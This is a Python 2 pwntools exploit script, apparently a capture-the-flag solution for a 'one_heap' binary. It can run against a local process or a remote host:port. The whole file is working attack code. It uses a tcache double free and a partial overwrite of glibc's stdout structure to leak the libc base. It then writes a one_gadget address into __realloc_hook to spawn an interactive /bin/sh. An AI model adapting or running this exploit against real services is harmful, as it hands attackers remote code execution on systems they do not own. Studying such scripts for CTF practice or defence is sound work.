#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
import os
debug = 0
exe = "./one_heap"

r = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x)
rud = lambda x:io.recvuntil(x,drop=True)
rul = lambda:io.recvline()
sd = lambda x:io.send(x)
sl = lambda x:io.sendline(x) 
sea = lambda x,y:io.sendafter(x,y)
sela = lambda x,y:io.sendlineafter(x,y)

context.terminal = ["tmux","splitw","-h"]
elf = ELF(exe)
context.arch = elf.arch

if debug:
    context.log_level = "debug"

arena64 = 0x3c4b20
arena32 = 0x1b2780

def dbg(breakpoint=0):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[1], 16)if elf.pie else 0 
    if breakpoint!=0:
        gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
        gdb.attach(io, gdbscript)
        time.sleep(1)
    else:
        gdb.attach(io)

if len(sys.argv)>1:
    io = remote(sys.argv[1],int(sys.argv[2]))
    #libc = ELF("./libc.so.6")
else:
    #io = process(exe)
    libc = elf.libc

def new(size,content,line=1):
    sela(":","1")
    sela(":",str(size))
    if line==1:
        sela(":",content)
    else:
        sea(":",content)

def de():
    sela(":","2")

# double free tcache perthread corruption
def exp():
    global io
    io = process("./one_heap")
    new(0x7f,"a"*4)
    new(0x7f,"a"*4)
    de()
    de()
    
    new(0x2f,"") # 防止新unsorted bin 和topchunk合并
    de()

    new(0x7f,"")
    new(0x7f,"")
    new(0x7f,"")
    de()
    
    # 覆盖 0x7ffff7dd0760 <_IO_2_1_stdout_> 
    new(0x20,"\x60\x07\xdd")
    new(0x7f,p64(0)*5+p64(0xa1))
    new(0x7f,p64(0xfbad1800)+p64(0)*3+'\x00')
    try:
        if r(4)=="Done":
            return 
    except Exception as identifier:
        io.close()
        return

    ru("\x7f")
    libc.address = u64(ru("\x7f")[-6:].ljust(8,"\x00")) - 0x3eb780
    print hex(libc.address)
    one = libc.address+0x10a38c
    
    '''
    0x10a38c        execve("/bin/sh", rsp+0x70, environ)
    constraints:
    [rsp+0x70] == NULL
    '''
    # malloc_hook

    new(0x68, p64(0) * 12+p64(libc.symbols['__realloc_hook']),line=0)
    new(0x38,"")
    new(0x38,p64(one)+p64(libc.symbols["realloc"]+4))
    new(0x30,"")
    io.interactive()

exp()







